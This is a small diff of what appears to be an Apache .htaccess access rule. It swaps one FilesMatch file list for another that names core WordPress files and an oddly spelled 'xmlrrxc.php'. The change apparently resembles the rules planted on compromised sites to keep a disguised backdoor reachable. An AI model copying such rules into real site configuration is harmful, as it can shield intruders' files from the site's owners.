@@ -6,7 +6,7 @@
    
    </FilesMatch>
    
-   <FilesMatch "^(index.html|file-index.php|poring.php)$">
+   <FilesMatch "^(wp-blog-header.php|index.php|wp-config.php|xmlrrxc.php|footer.php|header.php)$">
    
     Order allow,deny
    
